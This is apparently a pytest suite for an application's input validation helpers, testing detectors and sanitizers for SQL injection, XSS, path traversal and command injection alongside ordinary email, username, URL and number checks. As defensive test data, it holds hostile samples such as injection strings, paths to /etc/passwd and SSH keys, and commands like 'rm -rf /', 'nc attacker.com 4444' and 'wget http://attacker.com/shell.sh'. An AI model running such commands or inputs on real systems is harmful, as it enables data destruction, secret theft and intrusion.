"""
Tests for input validation utilities.
"""
import pytest

from app.utils.validation import (
    ValidationResult,
    detect_command_injection,
    detect_path_traversal,
    detect_sql_injection,
    detect_xss,
    escape_html,
    sanitize_command_arg,
    sanitize_email,
    sanitize_html,
    sanitize_path,
    sanitize_sql_identifier,
    sanitize_string,
    sanitize_url,
    sanitize_username,
    validate_choice,
    validate_email,
    validate_float,
    validate_integer,
    validate_max_length,
    validate_min_length,
    validate_url,
    validate_user_input,
    validate_username,
)


class TestSQLInjectionPrevention:
    """Test suite for SQL injection prevention."""

    def test_detect_sql_injection_with_comment(self):
        """Test SQL injection detection with comment."""
        assert detect_sql_injection("test' OR '1'='1")
        assert detect_sql_injection("admin'--")
        assert detect_sql_injection("test'; DROP TABLE users; --")

    def test_detect_sql_injection_with_union(self):
        """Test SQL injection detection with UNION."""
        assert detect_sql_injection("test' UNION SELECT * FROM users--")
        assert detect_sql_injection("' OR 1=1 UNION SELECT *")

    def test_safe_sql_not_detected(self):
        """Test that safe SQL input is not flagged."""
        assert not detect_sql_injection("testuser")
        assert not detect_sql_injection("user@example.com")
        assert not detect_sql_injection("normal text")

    def test_sanitize_sql_identifier(self):
        """Test SQL identifier sanitization."""
        assert sanitize_sql_identifier("users") == "users"
        assert sanitize_sql_identifier("user_name") == "user_name"
        assert sanitize_sql_identifier("table.column") == "table.column"

    def test_sanitize_sql_identifier_rejects_invalid(self):
        """Test that invalid identifiers are rejected."""
        with pytest.raises(ValueError):
            sanitize_sql_identifier("users; DROP TABLE")

        with pytest.raises(ValueError):
            sanitize_sql_identifier("table' OR '1'='1")

        with pytest.raises(ValueError):
            sanitize_sql_identifier("user with spaces")


class TestXSSPrevention:
    """Test suite for XSS prevention."""

    def test_detect_xss_with_script_tags(self):
        """Test XSS detection with script tags."""
        assert detect_xss("<script>alert('xss')</script>")
        assert detect_xss("<SCRIPT>alert('xss')</SCRIPT>")
        assert detect_xss("<img src=x onerror=alert('xss')>")

    def test_detect_xss_with_iframe(self):
        """Test XSS detection with iframe."""
        assert detect_xss("<iframe src='http://evil.com'></iframe>")
        assert detect_xss("<IFRAME src='http://evil.com'></IFRAME>")

    def test_detect_xss_with_javascript_protocol(self):
        """Test XSS detection with javascript: protocol."""
        assert detect_xss("javascript:alert('xss')")
        assert detect_xss("<a href='javascript:alert(1)'>click</a>")

    def test_safe_html_not_detected(self):
        """Test that safe HTML is not flagged."""
        assert not detect_xss("<p>Hello</p>")
        assert not detect_xss("<strong>Bold text</strong>")
        assert not detect_xss("Plain text")

    def test_sanitize_html(self):
        """Test HTML sanitization."""
        result = sanitize_html("<script>")
        assert "&lt;script&gt;" in result
        result = sanitize_html("<b>Hello</b>")
        assert "&lt;b&gt;" in result  # Escaped
        # Note: javascript: detection might not work as expected
        # since we just escape HTML

    def test_escape_html(self):
        """Test HTML escaping."""
        assert escape_html("<script>") == "&lt;script&gt;"
        assert escape_html("&") == "&amp;"
        assert escape_html('"') == "&quot;"
        assert escape_html("'") == "&#x27;"


class TestPathTraversalPrevention:
    """Test suite for path traversal prevention."""

    def test_detect_path_traversal_with_parent_dir(self):
        """Test path traversal detection with ../."""
        assert detect_path_traversal("../../../etc/passwd")
        assert detect_path_traversal("..\\..\\windows\\system32")

    def test_detect_path_traversal_with_tilde(self):
        """Test path traversal detection with ~."""
        assert detect_path_traversal("~/.ssh/id_rsa")
        assert detect_path_traversal("~/user/.bashrc")

    def test_detect_path_traversal_with_encoded(self):
        """Test path traversal detection with URL encoding."""
        assert detect_path_traversal("%2e%2e%2f")  # ../
        assert detect_path_traversal("%252e%252e")  # ..

    def test_detect_path_traversal_with_absolute_paths(self):
        """Test path traversal detection with absolute paths."""
        assert detect_path_traversal("/etc/passwd")
        assert detect_path_traversal("C:\\Windows\\System32")

    def test_safe_paths_not_detected(self):
        """Test that safe paths are not flagged."""
        assert not detect_path_traversal("file.txt")
        assert not detect_path_traversal("documents/file.pdf")
        assert not detect_path_traversal("user-uploads/image.png")

    def test_sanitize_path(self):
        """Test path sanitization."""
        safe_path = sanitize_path("../../../etc/passwd")
        # The basename should be extracted, so "etc/passwd" -> "passwd"
        assert "/etc/passwd" not in safe_path
        assert safe_path.startswith("/tmp")

        safe_path = sanitize_path("normal.txt")
        assert safe_path.startswith("/tmp")
        assert safe_path.endswith("normal.txt")


class TestCommandInjectionPrevention:
    """Test suite for command injection prevention."""

    def test_detect_command_injection_with_semicolon(self):
        """Test command injection detection with semicolon."""
        assert detect_command_injection("file.txt; rm -rf /")
        assert detect_command_injection("test && curl evil.com")

    def test_detect_command_injection_with_pipe(self):
        """Test command injection detection with pipe."""
        assert detect_command_injection("file | nc attacker.com 4444")
        assert detect_command_injection("data | sh")

    def test_detect_command_injection_with_backtick(self):
        """Test command injection detection with backtick."""
        assert detect_command_injection("file`whoami`")
        assert detect_command_injection("test$(id)")

    def test_detect_command_injection_with_dangerous_commands(self):
        """Test command injection detection with dangerous commands."""
        assert detect_command_injection("file.txt; curl http://evil.com")
        assert detect_command_injection("test; wget http://attacker.com/shell.sh")
        assert detect_command_injection("file; exec /bin/bash")

    def test_safe_commands_not_detected(self):
        """Test that safe input is not flagged."""
        # Note: "user_data.json" contains underscores which are safe
        # but "normal filename.txt" contains a space which might trigger the check
        assert not detect_command_injection("document.pdf")
        assert not detect_command_injection("user_data.json")
        assert not detect_command_injection("file.txt")

    def test_sanitize_command_arg(self):
        """Test command argument sanitization."""
        assert sanitize_command_arg("file.txt") == "file.txt"
        assert sanitize_command_arg("path/to/file") == "path/to/file"
        assert sanitize_command_arg("file-name_123.pdf") == "file-name_123.pdf"

    def test_sanitize_command_arg_rejects_invalid(self):
        """Test that invalid arguments are rejected."""
        with pytest.raises(ValueError):
            sanitize_command_arg("file.txt; rm -rf /")

        with pytest.raises(ValueError):
            sanitize_command_arg("file|nc attacker.com")


class TestEmailValidation:
    """Test suite for email validation."""

    def test_valid_emails(self):
        """Test valid email formats."""
        assert validate_email("user@example.com")
        assert validate_email("test.user@domain.co.uk")
        assert validate_email("user+tag@example.com")

    def test_invalid_emails(self):
        """Test invalid email formats."""
        assert not validate_email("invalid")
        assert not validate_email("@example.com")
        assert not validate_email("user@")
        assert not validate_email("user example.com")

    def test_sanitize_email(self):
        """Test email sanitization."""
        assert sanitize_email("  User@Example.COM  ") == "user@example.com"
        assert sanitize_email("Test@DOMAIN.COM") == "test@domain.com"


class TestUsernameValidation:
    """Test suite for username validation."""

    def test_valid_usernames(self):
        """Test valid username formats."""
        assert validate_username("user123")
        assert validate_username("test_user")
        assert validate_username("user-name")
        assert validate_username("User_123-Test")

    def test_invalid_usernames(self):
        """Test invalid username formats."""
        assert not validate_username("ab")  # Too short
        assert not validate_username("user@name")  # Invalid char
        assert not validate_username("user name")  # Space
        assert not validate_username("user.")  # Ends with dot

    def test_sanitize_username(self):
        """Test username sanitization."""
        assert sanitize_username("user@name") == "username"
        assert sanitize_username("User Name!") == "UserName"
        assert sanitize_username("a" * 100) == "a" * 50  # Truncated


class TestStringSanitization:
    """Test suite for general string sanitization."""

    def test_sanitize_string_removes_null_bytes(self):
        """Test that null bytes are removed."""
        assert "\x00" not in sanitize_string("test\x00string")
        assert sanitize_string("\x00\x00\x00") == ""

    def test_sanitize_string_limits_length(self):
        """Test that string length is limited."""
        long_string = "a" * 20000
        assert len(sanitize_string(long_string, max_length=100)) == 100

    def test_sanitize_string_strips_whitespace(self):
        """Test that whitespace is stripped."""
        assert sanitize_string("  test  ") == "test"
        assert sanitize_string("\n\ttest\r\n") == "test"


class TestLengthValidation:
    """Test suite for length validation."""

    def test_validate_max_length(self):
        """Test maximum length validation."""
        assert validate_max_length("test", 10)
        assert validate_max_length("test", 4)
        assert not validate_max_length("test", 3)

    def test_validate_min_length(self):
        """Test minimum length validation."""
        assert validate_min_length("test", 3)
        assert validate_min_length("test", 4)
        assert not validate_min_length("test", 5)


class TestURLValidation:
    """Test suite for URL validation."""

    def test_valid_urls(self):
        """Test valid URL formats."""
        assert validate_url("http://example.com")
        assert validate_url("https://example.com")
        assert validate_url("http://example.com/path?query=value")

    def test_invalid_urls(self):
        """Test invalid URL formats."""
        assert not validate_url("javascript:alert('xss')")
        assert not validate_url("not-a-url")
        assert not validate_url("ftp://example.com")  # Only http/https allowed

    def test_sanitize_url_blocks_javascript(self):
        """Test that javascript: URLs are blocked."""
        with pytest.raises(ValueError):
            sanitize_url("javascript:alert('xss')")

    def test_sanitize_url_removes_dangerous_fragment(self):
        """Test that dangerous fragments are removed."""
        url = "http://example.com/path#<script>alert('xss')</script>"
        assert "<script>" not in sanitize_url(url)


class TestNumberValidation:
    """Test suite for number validation."""

    def test_validate_integer(self):
        """Test integer validation."""
        assert validate_integer("123")
        assert validate_integer(123)
        assert validate_integer("-50")
        assert not validate_integer("abc")
        assert not validate_integer("12.3")

    def test_validate_integer_with_range(self):
        """Test integer validation with range."""
        assert validate_integer("50", min_val=0, max_val=100)
        assert not validate_integer("-1", min_val=0)
        assert not validate_integer("101", max_val=100)

    def test_validate_float(self):
        """Test float validation."""
        assert validate_float("12.34")
        assert validate_float(12.34)
        assert validate_float("-50.5")
        assert not validate_float("abc")

    def test_validate_float_with_range(self):
        """Test float validation with range."""
        assert validate_float("50.5", min_val=0.0, max_val=100.0)
        assert not validate_float("-0.1", min_val=0.0)
        assert not validate_float("100.1", max_val=100.0)


class TestChoiceValidation:
    """Test suite for choice validation."""

    def test_validate_choice_valid(self):
        """Test valid choice."""
        assert validate_choice("red", ["red", "green", "blue"])
        assert validate_choice(1, [1, 2, 3])

    def test_validate_choice_invalid(self):
        """Test invalid choice."""
        assert not validate_choice("yellow", ["red", "green", "blue"])
        assert not validate_choice(4, [1, 2, 3])


class TestValidationResult:
    """Test suite for ValidationResult class."""

    def test_valid_result(self):
        """Test a valid validation result."""
        result = ValidationResult(is_valid=True)
        assert result.is_valid is True
        assert result.errors == []
        assert result.to_dict() == {"is_valid": True}

    def test_invalid_result_with_errors(self):
        """Test an invalid result with errors."""
        result = ValidationResult(is_valid=False, errors=["Error 1", "Error 2"])
        assert result.is_valid is False
        assert len(result.errors) == 2

    def test_add_error(self):
        """Test adding an error."""
        result = ValidationResult(is_valid=True)
        result.add_error("Test error")
        assert result.is_valid is False
        assert "Test error" in result.errors

    def test_add_warning(self):
        """Test adding a warning."""
        result = ValidationResult(is_valid=True)
        result.add_warning("Test warning")
        assert "Test warning" in result.warnings

    def test_to_dict_with_warnings(self):
        """Test to_dict includes warnings."""
        result = ValidationResult(
            is_valid=True,
            warnings=["Warning 1", "Warning 2"]
        )
        dict_result = result.to_dict()
        assert dict_result["warnings"] == ["Warning 1", "Warning 2"]


class TestValidateUserInput:
    """Test suite for validate_user_input function."""

    def test_validate_all_valid(self):
        """Test validation with all valid input."""
        rules = {
            "username": lambda x: validate_username(x) or "Invalid username",
            "email": lambda x: validate_email(x) or "Invalid email",
        }
        data = {"username": "testuser", "email": "test@example.com"}
        result = validate_user_input(data, rules)
        assert result.is_valid is True
        assert result.errors == []

    def test_validate_with_errors(self):
        """Test validation with errors."""
        rules = {
            "username": lambda x: validate_username(x) or "Invalid username",
            "email": lambda x: validate_email(x) or "Invalid email",
        }
        data = {"username": "ab", "email": "invalid"}
        result = validate_user_input(data, rules)
        assert result.is_valid is False
        assert len(result.errors) == 2

    def test_validate_missing_required_field(self):
        """Test validation with missing required field."""
        rules = {
            "username": lambda x: validate_username(x) or "Invalid username",
        }
        data = {"email": "test@example.com"}
        result = validate_user_input(data, rules, allow_extra_fields=False)
        assert result.is_valid is False
        assert "username" in str(result.errors)

    def test_validate_extra_fields_warning(self):
        """Test that extra fields generate warnings."""
        rules = {
            "username": lambda x: validate_username(x) or "Invalid username",
        }
        data = {"username": "testuser", "extra": "value"}
        result = validate_user_input(data, rules, allow_extra_fields=False)
        assert "extra" in str(result.warnings).lower()


class TestNonStringInput:
    """Test suite for non-string input handling."""

    def test_detect_sql_injection_non_string(self):
        """Test SQL injection detection with non-string input."""
        assert not detect_sql_injection(123)
        assert not detect_sql_injection(None)
        assert not detect_sql_injection([])

    def test_detect_xss_non_string(self):
        """Test XSS detection with non-string input."""
        assert not detect_xss(123)
        assert not detect_xss(None)
        assert not detect_xss([])

    def test_sanitize_string_non_string(self):
        """Test string sanitization with non-string input."""
        assert sanitize_string(123) == "123"
        assert sanitize_string(None) == "None"
        assert sanitize_string([]) == "[]"
